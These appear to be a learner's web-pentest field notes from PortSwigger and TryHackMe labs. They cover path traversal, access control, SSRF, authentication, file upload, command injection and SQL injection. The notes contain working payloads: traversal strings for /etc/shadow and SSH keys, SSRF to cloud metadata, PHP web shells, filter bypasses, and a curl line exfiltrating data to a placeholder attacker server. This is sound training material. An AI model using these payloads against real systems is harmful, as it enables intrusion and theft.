# Server-Side Vulnerabilities — Pentest Field Notes
**Source:** PortSwigger Web Security Academy + TryHackMe Labs  
**Type:** Offensive Security / Web Application Pentesting  
**Topics:** Path Traversal · Access Control · SSRF · Authentication · File Upload · OS Command Injection  
**Status:** Completed ✓

---

## Attack Decision Tree — Which Technique to Use

| Step | Condition | Technique |
|------|-----------|-----------|
| 1 | App loads files by filename from user input? | Path Traversal → Section 01 |
| 2 | Admin pages accessible without login? | Broken Access Control → Section 02 |
| 3 | Can change ID/parameter to access other users? | IDOR / Horizontal Escalation → Section 02 |
| 4 | App makes HTTP requests to URLs you provide? | SSRF → Section 03 |
| 5 | Login form with no lockout? | Brute Force / Username Enumeration → Section 04 |
| 6 | 2FA implemented? | Test 2FA Bypass → Section 04 |
| 7 | File upload feature exists? | File Upload → Web Shell → Section 05 |
| 8 | App calls system commands with user input? | OS Command Injection → Section 06 |
| 9 | Database queries use user input? | SQL Injection → see SQLi notes |

---

## Recon Checklist — First 10 Minutes of Any Pentest

- [ ] Check `/robots.txt` — often reveals hidden admin paths
- [ ] View page source — look for hidden URLs in JavaScript
- [ ] Check all JS files for API endpoints and role logic
- [ ] Try `/admin` `/backup` `/config` `/dashboard`
- [ ] Test parameter tampering: `?admin=true` `?role=1`
- [ ] Test ID increment on all parameters (IDOR)
- [ ] Look for file upload features
- [ ] Look for `stockApi=` or `url=` parameters (SSRF)
- [ ] Test login fields with `'` for SQL injection
- [ ] Check for verbose error messages

---

## 01 — Path Traversal

**Goal:** escape the web root directory and read any file on the server using `../` sequences.

### How It Works

```
App loads: /var/www/images/218.png
Inject:    ../../../etc/passwd
Server reads: /var/www/images/../../../etc/passwd
           = /etc/passwd  ← outside web root! 💀
```

**Normal request:**
```
GET /loadImage?filename=218.png
→ server reads: /var/www/images/218.png
```

**Attack:**
```
GET /loadImage?filename=../../../etc/passwd
→ server reads: /etc/passwd 💀
```

### How `../` Works — Each One Goes Up One Level

```
/var/www/images/   ← start here
/var/www/          ← one ../
/var/              ← two ../../
/                  ← three ../../../  = filesystem root
/etc/passwd        ← now read anything!
```

### Syntax by Operating System

| OS | Traversal Sequence | Example Target |
|----|-------------------|----------------|
| Linux / Unix | `../` | `../../../etc/passwd` |
| Windows | `..\` or `../` | `..\..\..\windows\win.ini` |

### Bypass Techniques — When Basic `../` Is Blocked

| Bypass | Payload | Why It Works |
|--------|---------|--------------|
| URL encode | `..%2f..%2f..%2fetc/passwd` | `%2f` = `/` decoded by server |
| Double encode | `..%252f..%252fetc/passwd` | `%25` = `%` so `%252f` = `%2f` |
| Nested traversal | `....//....//etc/passwd` | stripping `../` leaves `../` |
| Absolute path | `/etc/passwd` | skip traversal entirely |
| Null byte | `../../../etc/passwd%00.jpg` | `%00` truncates after extension check |

### Interesting Files to Target

| File | Contents |
|------|----------|
| `/etc/passwd` | User list (Linux) |
| `/etc/shadow` | Password hashes (Linux) |
| `/etc/hosts` | Network config |
| `~/.ssh/id_rsa` | SSH private key |
| `/var/www/html/config.php` | Database credentials |
| `C:\windows\win.ini` | Windows config |
| `/proc/self/environ` | Environment variables |

> **Prevention:** never pass user-controlled filenames to filesystem APIs. Use a whitelist of allowed files, or store files with randomly generated names mapped to real paths in a database.

---

## 02 — Access Control Vulnerabilities

**Goal:** gain access to functionality or data you're not authorized to access.

### Vertical vs Horizontal Privilege Escalation

**Vertical — access higher privilege level:**

```
You: regular user
Goal: access /admin panel

Examples:
Browse to: /admin               ← unprotected URL
Check: /robots.txt              ← admin URLs listed!
Read page JS source             ← hidden URLs in code
Change: ?admin=true             ← parameter tampering
Change: cookie role=admin       ← cookie tampering
```

**Horizontal — access another user's data:**

```
Your account: /myaccount?id=123
Other user:   /myaccount?id=124   ← just increment!
Admin:        /myaccount?id=1     ← try low IDs

This is called IDOR = Insecure Direct Object Reference
```

**Horizontal → Vertical (chain attacks):**
```
Find admin GUID in reviews/messages/source
→ access admin account
→ vertical escalation achieved! 💀
```

### robots.txt — Why It Helps Attackers

Developers add to `robots.txt` to hide pages from Google search results.  
**Problem: `robots.txt` is PUBLIC — anyone can read it!**

```
Visit: https://target.com/robots.txt

Might see:
Disallow: /admin
Disallow: /backup
Disallow: /internal-dashboard
Disallow: /config

← FREE MAP of sensitive pages! 💀
```

> Always check `/robots.txt` — it's the first thing a pentester visits on any target.

### GUIDs — What They Are and Why They Still Leak

**GUID = Globally Unique Identifier** — a long random string like:  
`550e8400-e29b-41d4-a716-446655440000`

```
Normal IDs (easy to enumerate):
/account?id=1   ← just increment!
/account?id=2
/account?id=3

GUIDs (hard to guess):
/account?id=550e8400-e29b-41d4-a716-446655440000
```

**BUT GUIDs still leak in:**
- User posts and comments (author GUID visible in source)
- API responses listing users
- Email notification links
- Page source code

```
Find GUID anywhere on site → use it for IDOR! 💀
```

### Security by Obscurity — Hidden URLs Still Leak

Developer hides admin panel with random URL:
```
https://site.com/administrator-panel-yb556
```

But JavaScript in the page source reveals it:
```javascript
<script>
  var isAdmin = false;
  if (isAdmin) {
    adminPanelTag.setAttribute('href',
      'https://site.com/administrator-panel-yb556');  // ← visible to everyone!
  }
</script>
```

`isAdmin=false` so the link isn't shown — but **the URL is in the source code**.  
View page source → find it immediately. 💀

> **Prevention:** enforce access control server-side on EVERY request. Never rely on hiding URLs, client-side checks, or obscure IDs. Deny by default.

---

## 03 — Server-Side Request Forgery (SSRF)

**Goal:** trick the server into making HTTP requests on your behalf. The server is trusted by internal systems — use it as a proxy to reach things you can't access directly.

### Core Concept

```
Normal:  YOU → Website → External API
SSRF:    YOU → Website → Internal systems (as the trusted server!)

You (untrusted) → App Server (trusted) → Internal systems 💀
```

**Normal stock check:**
```
stockApi=http://stock.website.com/check?productId=1
```

**SSRF attack — point to localhost:**
```
stockApi=http://localhost/admin
```

**SSRF attack — point to internal network:**
```
stockApi=http://192.168.0.1:8080/admin
```

### Why the Server Trusts Itself — 3 Reasons

1. **Access control bypass:** check is in a separate component (load balancer) — loopback requests skip it entirely
2. **Disaster recovery:** app allows admin access from localhost without login — "only trusted users would be on the server"
3. **Admin on different port:** e.g. port 8080 not reachable from outside — only reachable from the server itself

### SSRF Attack Types

| Type | Payload | Goal |
|------|---------|------|
| Against server | `stockApi=http://localhost/admin` | Bypass auth on admin panel |
| Against internal network | `stockApi=http://192.168.0.1:8080/admin` | Reach internal services |
| Internal IP scan | `stockApi=http://192.168.0.§1§:8080/admin` | Find active internal hosts |
| Cloud metadata | `stockApi=http://169.254.169.254/latest/meta-data/` | Steal AWS/cloud credentials |

### Lab Tip — Scanning Internal Network with Intruder

```
stockApi=http://192.168.0.§1§:8080/admin

Intruder → Sniper → Numbers 1-255

Reading responses:
500 Internal Server Error → nothing at that IP
400 Bad Request           → server EXISTS, check path/params
200 OK                    → admin panel found! ✅

Found it? Delete carlos:
stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
```

> **400 Bad Request ≠ failure** — it means the server EXISTS at that IP but your request format is slightly wrong. 500 = nothing there.

> **Cloud metadata endpoint:** `169.254.169.254` is a magic IP on AWS/Azure/GCP that returns instance credentials. Always try this in cloud environments.

### SSRF Bypass Techniques — When Basic SSRF Is Blocked

| Bypass | Payload |
|--------|---------|
| Different localhost representations | `http://127.0.0.1` `http://127.1` `http://0.0.0.0` `http://0` |
| DNS that resolves to 127.0.0.1 | `http://localhost` |
| URL encode | `http://127.0.0.1/%61dmin` (`a` = `%61`) |
| Redirect | Host a 302 redirect on your server pointing to `http://localhost/admin` |
| HTTPS instead of HTTP | `https://localhost/admin` |

> **Prevention:** whitelist allowed URLs/domains server-side. Never let users control the full URL. Block outbound requests to internal IP ranges from the app server.

---

## 04 — Authentication Vulnerabilities

**Authentication** = proving who you are.  
**Authorization** = what you're allowed to do.  
Breaking authentication gives an attacker an identity. Breaking authorization gives them more power once inside.

### Username Enumeration — Detect Valid Usernames

```
Invalid username:
→ "Invalid username or password"   ← generic, no info

Valid username, wrong password:
→ "Incorrect password"             ← reveals username exists! 💀
→ Different response time          ← timing reveals it!
→ Different HTTP status code       ← reveals it!
```

**Burp Intruder workflow:**
```
Sniper attack → payload = common username wordlist
Look for: different response length or status code
```

### Brute Force Attack Workflow — Burp Intruder

1. Intercept login POST request in Burp
2. Send to Intruder → mark username and password as payload positions
3. Attack type: **Pitchfork** (test pairs) or **Cluster Bomb** (all combinations)
4. Payload 1: common usernames (`admin`, `administrator`, `wiener`, `carlos`...)
5. Payload 2: common passwords (`password`, `123456`, `Password1!`...)
6. Look for **302 redirect** or **different response length** = successful login!

### Human Password Patterns — Makes Brute Force Smarter

```
Policy requires uppercase + number + special:
mypassword → Mypassword1!  or  Myp4$$w0rd

Password rotation policies:
Mypassword1! → Mypassword1? → Mypassword2!
```

Build targeted wordlists using these patterns. Tools: `hashcat rules`, `crunch`, `cupp`

### 2FA Bypass — Skip the Second Step

```
Flawed 2FA flow:
Step 1: enter username + password  → logged in state! ← session set here
Step 2: enter 2FA code             → supposed to verify

Attack:
After step 1, directly navigate to /my-account or /dashboard
If app doesn't verify 2FA completion → you're in! 💀

Also try:
Intercept 2FA page request
Change account identifier in cookie/param to victim's username
→ bypass their 2FA
```

> **Prevention:** rate limit and lock accounts after failed attempts. Use consistent error messages. Verify 2FA completion server-side before granting access to any protected resource.

---

## 05 — File Upload Vulnerabilities

**Goal:** upload a malicious file that the server executes → web shell → run any OS command via HTTP.

### The Web Shell

```php
// Simple — read one file:
<?php echo file_get_contents('/home/carlos/secret'); ?>

// Versatile — run any command:
<?php echo system($_GET['command']); ?>
```

**After uploading `exploit.php`, visit:**
```
/files/avatars/exploit.php?command=id
/files/avatars/exploit.php?command=cat+/home/carlos/secret
/files/avatars/exploit.php?command=ls+-la
/files/avatars/exploit.php?command=whoami
```

### Attack 1 — No Validation (Basic Lab)

1. Create `exploit.php` with `<?php echo system($_GET['command']); ?>`
2. Upload directly through avatar/image upload
3. Visit `/files/avatars/exploit.php?command=cat+/home/carlos/secret`
4. Server executes PHP → secret returned ✅

### Attack 2 — Content-Type Bypass

Server checks `Content-Type` header **only** — never checks actual file contents!

```
Normal PHP upload (BLOCKED):
filename: exploit.php
Content-Type: application/x-php   ← server blocks this

Bypass (ALLOWED):
filename: exploit.php
Content-Type: image/jpeg           ← LIE! server believes it ✅

In Burp Repeater:
→ intercept upload request
→ find: Content-Type: application/x-php
→ change to: Content-Type: image/jpeg
→ forward → PHP file saved on server 💀
```

### Other Bypass Techniques

| Defense | Bypass |
|---------|--------|
| Extension blacklist (`.php` blocked) | Try `.php5` `.phtml` `.pHp` `.php.jpg` |
| Extension whitelist (`.jpg` only) | Try `exploit.php%00.jpg` (null byte) |
| Magic bytes check | Add real JPEG header bytes before PHP: `FF D8 FF <?php...` |
| Content-Type check | Change to `image/jpeg` in Burp |
| Client-side JS validation | Use Burp Intercept — JS never runs in Burp! |

### Client-Side JS Validation Bypass — Important

```javascript
// JS validation runs in BROWSER only — useless against Burp!
if (filename.endsWith('.php')) { alert("blocked!"); }
```

**Method 1 — Disable JS in browser console:**
```javascript
document.inputForm.onsubmit = null
// then submit form directly with malicious file
```

**Method 2 — Burp Intercept:**
```
Submit form with valid .jpg file → JS passes it
Burp catches request BEFORE server
Change filename to exploit.php in Burp
Forward → server receives PHP file, no JS check on server
```

### Getting 302 After Login Injection — Session Cookie Issue

```
Problem:
Using Burp Repeater → get 302 → cookie not stored in browser
Going to /home manually → no session → login page again

Fix:
Use Burp INTERCEPT (not Repeater)
Browser follows the 302 redirect automatically
Browser stores session cookie automatically
Flag shows up on home page ✅
```

> **Prevention:** whitelist allowed extensions server-side. Validate actual file contents (magic bytes). Store uploads outside web root. Rename files to random names. Use separate domain for user content.

---

## 06 — OS Command Injection

**Goal:** inject shell commands into application input that gets passed to the OS. Similar to SQLi but targets the operating system shell.

### How It Works

```
App runs OS command with user input:
stockreport.pl 29 500
               ↑   ↑
        productID storeID ← from user input!

Inject shell separator:
storeID = 500; whoami

Command becomes:
stockreport.pl 29 500; whoami
→ runs stockreport, THEN runs whoami! 💀
```

### Shell Separators — Ways to Chain Commands

| Separator | Behavior | OS |
|-----------|----------|----|
| `;` | Run second command regardless | Linux/Mac |
| `&` | Run both simultaneously | Linux + Windows |
| `&&` | Run second only if first succeeds | Linux + Windows |
| `\|` | Pipe output to second command | Linux + Windows |
| `\|\|` | Run second only if first FAILS | Linux + Windows |
| `` `command` `` | Backtick subshell | Linux |
| `$(command)` | Subshell execution | Linux |

### Useful Commands Once Injected

| Goal | Linux | Windows |
|------|-------|---------|
| Current user | `whoami` | `whoami` |
| OS info | `uname -a` | `ver` |
| Network config | `ifconfig` | `ipconfig /all` |
| Running processes | `ps aux` | `tasklist` |
| Read file | `cat /etc/passwd` | `type C:\windows\win.ini` |
| List directory | `ls -la` | `dir` |
| Find files | `find / -name secret 2>/dev/null` | `where /r C:\ secret` |

### Blind OS Command Injection — No Output Visible

```bash
# No output? Use time delay to confirm:
productID=1; ping -c 10 127.0.0.1
# 10 second delay = injection works!

# Redirect output to web-accessible file:
productID=1; whoami > /var/www/html/output.txt
# then visit: /output.txt to read result

# Out-of-band: send data to your server:
productID=1; curl http://YOUR-SERVER/?x=$(whoami)
# your server receives: /?x=www-data
```

> **Prevention:** never pass user input to OS commands. Use language-native APIs instead of shell commands. If unavoidable, whitelist allowed input values strictly and sanitize all special shell characters.

---

## 07 — Lab Tips, Errors Fixed & Lessons Learned

### SQL Injection — Errors Fixed Together

| Error Encountered | Fix |
|-------------------|-----|
| Both TRUE and FALSE conditions returning 500 | Database was Oracle — needed `TO_CHAR(1/0)` and `\|\|` concatenation style, not `AND='a'` style |
| Payload cut off — "syntax error at end of input position 97" | TrackingId too long — shorten to just `x` before your injection |
| CAST() giving "more than one row" error | Add `LIMIT 1` to subquery |
| CAST() giving "argument of AND must be boolean" | Change `AND CAST()` to `AND 1=CAST()` |
| `information_schema` returning hundreds of system tables | Add `WHERE table_schema='public'` |
| Oracle SUBSTRING error | Oracle uses `SUBSTR` not `SUBSTRING` |
| WAF returning "Attack detected" even with encoded payload | Partial encoding fails — use Hackvertor `<@hex_entities>` to encode EVERYTHING |
| Time-based blind: can't tell which response was delayed | Intruder results → Columns → enable "Response received", sort by it |
| Oracle payload always 500 on both true/false | Switch from `AND` style to `\|\|payload\|\|'` concatenation style |

### Access Control Labs — Key Lessons

1. Always check `/robots.txt` first — often reveals hidden admin paths
2. Read ALL JavaScript source on every page — hidden URLs and role logic visible
3. Try `?admin=true` and `?role=1` on login redirects
4. For IDOR: increment IDs, look for GUIDs in page source, user reviews, API responses
5. Horizontal → vertical: find admin user's GUID anywhere on site → access their account

### SSRF Lab — Key Lessons

1. **400 Bad Request ≠ failure** — server EXISTS at that IP, request format slightly wrong. 500 = nothing there
2. Always visit admin panel first (`stockApi=http://192.168.0.X:8080/admin`) to see exact delete URL format
3. Status codes: 500 = wrong IP, 400 = IP exists wrong path/params, 200 = found it!

### File Upload Lab — Key Lessons

1. Client-side JS validation is useless — Burp Intercept bypasses it (JS never runs in Burp)
2. Content-Type check only = weak — just change `application/x-php` to `image/jpeg`
3. After uploading shell → file is at `/files/avatars/exploit.php?command=cat+/home/carlos/secret`
4. Getting 302 after login injection? Use Burp **Intercept** not Repeater — browser follows redirect and stores session cookie

### THM SQL Injection — OR 1=1 Operator Precedence

```sql
-- Why this works:
WHERE profileID=10 OR 1=1 AND password='hash'

-- AND executes BEFORE OR (higher precedence):
WHERE profileID=10 OR (1=1 AND password='hash')
                   = profileID=10 OR TRUE
                   = TRUE  → returns ALL rows! 💀

-- String field injection — must close quote first:
-- Input: 1' or '1'='1'-- -
WHERE profileID='1' or '1'='1'-- -' AND password='hash'
                                ↑↑↑↑↑
                           comments out the rest!
-- '1'='1' = always TRUE → login bypassed! 💀
```

---

## 08 — Database Syntax Cheat Sheet

| Feature | MySQL | PostgreSQL | Oracle | SQL Server |
|---------|-------|-----------|--------|-----------|
| Comment | `--` or `#` | `--` | `--` | `--` |
| UNION NULL | `UNION SELECT NULL--` | `UNION SELECT NULL--` | `UNION SELECT NULL FROM dual--` | `UNION SELECT NULL--` |
| Substring | `SUBSTRING(x,1,1)` | `SUBSTRING(x,1,1)` | `SUBSTR(x,1,1)` | `SUBSTRING(x,1,1)` |
| Concat | `CONCAT(a,'~',b)` | `a\|\|'~'\|\|b` | `a\|\|'~'\|\|b` | `a+'~'+b` |
| Version | `@@version` | `version()` | `SELECT * FROM v$version` | `@@version` |
| Sleep | `SLEEP(10)` | `pg_sleep(10)` | `dbms_pipe.receive_message('a',10)` | `WAITFOR DELAY '0:0:10'` |
| Row limit | `LIMIT 1` | `LIMIT 1` | `WHERE ROWNUM=1` | `TOP 1` |
| Error crash | `1/0` | `1/0` | `TO_CHAR(1/0)` | `1/0` |
| Tables list | `information_schema.tables` | `information_schema.tables` | `all_tables` | `information_schema.tables` |
| Columns list | `information_schema.columns` | `information_schema.columns` | `all_columns` | `information_schema.columns` |

### URL Encoding Quick Ref

| Character | URL Encode |
|-----------|-----------|
| space | `+` |
| `;` | `%3B` |
| `'` | `%27` |
| `#` | `%23` |
| `%` | `%25` |
| `=` | `%3D` |

---

## Common Mistakes That Burn Time

| Mistake | Fix |
|---------|-----|
| MySQL: `--` not working | Add space after: `-- ` or use `#` or `--+` in URLs |
| Oracle: payload always 500 on both conditions | Switch from AND style to `\|\|` concatenation style |
| Oracle: `1/0` not crashing | Wrap with `TO_CHAR(1/0)` |
| Oracle: SUBSTRING error | Oracle uses `SUBSTR` not `SUBSTRING` |
| Payload cut off at char 95 | Shorten TrackingId to just `x` |
| 302 redirect but no session in browser | Use Burp Intercept not Repeater |
| SSRF: 400 error on IP scan | 400 = server exists, not failure — visit /admin to get correct path |
| File upload: Content-Type blocked | Change to `image/jpeg` in Burp |
| JS validation blocking file upload | Disable with `document.inputForm.onsubmit = null` or use Intercept |
| robots.txt ignored | Always check it — reveals hidden admin paths |
| GUID not found | Look in page source, user reviews, API responses, email links |
| WAF blocking SQL payload | Use Hackvertor `<@hex_entities>` to encode everything, not just keywords |


*Server-Side Vulnerabilities Pentest Field Notes — update as knowledge grows*
